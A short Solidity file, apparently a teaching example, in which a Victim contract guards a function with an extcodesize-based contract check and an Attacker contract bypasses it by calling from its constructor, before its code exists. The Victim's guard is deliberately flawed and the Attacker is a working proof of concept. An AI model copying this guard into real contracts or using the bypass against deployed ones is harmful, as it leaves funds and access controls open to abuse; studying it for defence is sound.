pragma solidity 0.8.20;

contract Victim {

   bool public tricked; 

   function isContract(address _addToEval) public view returns(bool){
     // The code is only stored at the end of the
     // constructor execution. 
     //Thus extcodesize returns 0 for contracts in construction
     uint32 size;
     assembly {
       size := extcodesize(_addToEval)
     }
     return (size > 0);
   }

 function supposedToBeProtected() external {
  require(!isContract(msg.sender), "caller is not an EOA");
        tricked = true;
 }

}

contract Attacker {
  
   bool public successfulAttack;
   Victim v;
  
   constructor(address _v) {
       v = Victim(_v);
       // address(this) doesn't have code, yet. Thus, it will bypass 
       //isContract() check 
       v.supposedToBeProtected();
       //tricked was set to true on the above execution
       successfulAttack = v.tricked(); 
   }
}